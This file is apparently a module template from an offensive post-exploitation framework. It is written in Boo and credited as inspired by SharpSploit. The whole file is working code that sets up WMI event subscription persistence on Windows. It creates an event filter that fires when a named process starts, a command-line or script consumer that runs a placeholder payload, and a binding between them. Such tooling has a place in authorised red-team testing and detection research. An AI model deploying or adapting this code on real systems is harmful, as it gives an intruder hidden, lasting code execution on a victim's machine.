/*
    This module is inspired from SharpSploit (https://github.com/cobbr/SharpSploit)
*/
import System
import System.Management


private static def CreateEventFilter(EventName as string, ProcessName as string) as ManagementObject:
    _EventFilter as ManagementObject = null
    try:
        scope as ManagementScope = ManagementScope("\\\\.\\root\\subscription")
        wmiEventFilter as ManagementClass = ManagementClass(scope, ManagementPath("__EventFilter"), null)

        query as string = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='" + ProcessName + "'"

        wql as WqlEventQuery = WqlEventQuery(query)
        _EventFilter = wmiEventFilter.CreateInstance()
        _EventFilter["Name"] = EventName
        _EventFilter["Query"] = wql.QueryString
        _EventFilter["QueryLanguage"] = wql.QueryLanguage
        _EventFilter["EventNameSpace"] = "root/cimv2"
        _EventFilter.Put()
    except e:
        print e
    return _EventFilter


private static def CreateEventConsumer(ConsumerName as string, EventConsumer as int, Payload as string, ScriptingEngine as int) as ManagementObject:
    _EventConsumer as ManagementObject = null
    try:
        scope as ManagementScope = ManagementScope("\\\\.\\root\\subscription")
        if (EventConsumer == 1):
            _EventConsumer = ManagementClass(scope, ManagementPath("CommandLineEventConsumer"), null).CreateInstance()
            _EventConsumer["Name"] = ConsumerName
            _EventConsumer["RunInteractively"] = false
            _EventConsumer["CommandLineTemplate"] = Payload
        elif (EventConsumer == 2):
            _EventConsumer = ManagementClass(scope, ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance()
            _EventConsumer["Name"] = ConsumerName

            if (ScriptingEngine == 1):
                _EventConsumer["ScriptingEngine"] = "JScript"
            elif (ScriptingEngine == 2):
                _EventConsumer["ScriptingEngine"] = "VBScript"

            _EventConsumer["ScriptText"] = Payload
        _EventConsumer.Put()

    except e:
        print e.Message
    return _EventConsumer


private static def CreateBinding(EventFilter as ManagementObject, EventConsumer as ManagementObject):
    scope as ManagementScope = ManagementScope("\\\\.\\root\\subscription")
    _Binding as ManagementObject = ManagementClass(scope, ManagementPath("__FilterToConsumerBinding"), null).CreateInstance()

    _Binding["Filter"] = EventFilter.Path.RelativePath
    _Binding["Consumer"] = EventConsumer.Path.RelativePath
    _Binding.Put()


public static def Main():
    EventName = 'EVENT_NAME'
    EventConsumer = EVENT_CONSUMER
    Payload = 'PAYLOAD'
    ProcessName = 'PROCESS_NAME'
    ScriptingEngine = SCRIPTING_ENGINE

    try:
        eventFilter as ManagementObject = CreateEventFilter(EventName, ProcessName)
        eventConsumer as ManagementObject = CreateEventConsumer(EventName, EventConsumer, Payload, ScriptingEngine)
        CreateBinding(eventFilter, eventConsumer)
        print "[*] WMI persistence succeeded for event: " + EventName + " with process: " + ProcessName
    except e:
        print "[X] WMI Exception: " + e.Message
